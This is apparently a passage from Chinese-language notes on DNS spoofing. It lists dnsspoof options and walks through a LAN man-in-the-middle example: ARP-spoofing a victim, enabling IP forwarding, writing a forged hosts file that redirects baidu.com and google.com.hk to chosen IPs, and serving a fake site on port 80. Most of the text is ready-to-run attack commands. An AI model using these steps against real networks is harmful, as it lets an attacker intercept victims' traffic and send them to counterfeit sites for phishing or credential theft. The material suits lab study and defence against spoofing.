-i 指定一个网卡
-f 指定要欺骗的网址,如果不指定，将返回本机的IP地址给被攻击者
expression      指定一个Tcpdump规则的包过滤



## 案例

网关
    192.168.1.1
受害者
    192.168.1.100
攻击者
    192.168.1.200

1. 进行dnsspoof前首先要进行arpspoof双向欺骗，做中间人攻击
    sudo arpspoof -t 192.168.1.100 -r 192.168.1.200

1. 开启转发
    sysctl -w net.ipv4.ip_forward=1

1. 按照hosts文件格式，创建一个dnsspoof.hosts文件, 当受害者请求该文件中的域名解析时，我们就返回给他一个伪造的IP地址，让其访问我们伪造的网站。

cat dnsspoof.hosts
54.222.60.252 .baidu.com    //54.222.60.252 www.z.cn
10.10.10.3 .google.com.hk

1. dns攻击
    dnsspoof -i wlp5s0 -f dnsspoof.hosts




也可以在本地开一个80端口创建网站,关闭ip转发，将被攻击者请求的所有ip转到localhost
    sudo python -m SimpleHTTPServer 80

sudo dnsspoof 


典型的dnsspoof_list.txt的内容
    192.168.2.1 www*



## 知识
1. 默认hosts文件
    /etc/hosts

1. 重启网络
    /etc/init.d/networking restart
